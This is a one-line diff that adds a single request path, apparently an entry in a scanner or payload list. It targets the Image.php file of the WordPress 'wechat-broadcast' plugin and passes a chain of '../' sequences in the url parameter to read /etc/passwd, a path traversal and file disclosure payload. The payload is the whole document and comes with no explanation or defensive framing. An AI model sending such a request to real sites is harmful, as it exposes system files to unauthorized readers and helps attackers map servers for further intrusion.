@@ -1,0 +1,1 @@
+/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd
